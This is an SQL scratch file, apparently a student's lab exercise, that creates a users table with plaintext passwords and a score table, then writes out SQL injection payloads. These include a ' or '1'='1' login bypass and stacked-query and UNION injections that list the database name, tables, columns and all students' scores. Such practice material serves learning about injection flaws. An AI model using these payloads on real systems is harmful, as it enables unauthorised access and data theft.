drop table users

create table users (
	code varchar(20) unique,
	username varchar(255),
	password varchar(255),
	role VARCHAR(20) CHECK (role IN ('giangvien', 'hocsinh'))
)

CREATE TABLE score (
    code varchar(255),
    avg float,
    FOREIGN KEY (code) REFERENCES users(code)
);

insert into users (code, username, password, role) values
('AT170538', 'phuongkma', '123456' ,'hocsinh'),
('AT170539', 'sinhkma', '123456' ,'giangvien'),
('AT170540', 'manhkma', '123456', 'hocsinh'),
('AT170541', 'haikma', '123456', 'giangvien')

insert into score (code, avg) values
('AT170538', 9.9),
('AT170540', 8)

insert into score (code, avg) values
('AT170538', 9.9),

SELECT * FROM users WHERE username = 'manhkma' AND password = '' or '1' = '1'

-- Get database name
SELECT u.code, u.username, s.avg FROM users u LEFT JOIN score s ON s.code = u.code WHERE u.code = 'AT170538' AND u.username = ''; SELECT CURRENT_DATABASE() --'

-- Get column name in table
SELECT u.code, u.username, s.avg FROM users u LEFT JOIN score s ON s.code = u.code WHERE u.code = 'AT170538' AND u.username = ''; SELECT DISTINCT role FROM users --'

-- Get data in column
SELECT u.code, u.username, s.avg FROM users u LEFT JOIN score s ON s.code = u.code WHERE u.code = 'AT170538' AND u.username = ''; SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' --'

-- Get list table
SELECT u.code, u.username, s.avg FROM users u LEFT JOIN score s ON s.code = u.code WHERE u.code = 'AT170538' AND u.username = ''; SELECT table_name FROM information_schema.tables WHERE table_schema='public' --'

-- Get score all user
SELECT u.code, u.username, s.avg FROM users u LEFT JOIN score s ON s.code = u.code WHERE u.code = 'AT170538' AND u.username = '' UNION ALL SELECT u.code, u.username, s.avg FROM users u LEFT JOIN score s ON s.code = u.code WHERE u.role = 'hocsinh' --'
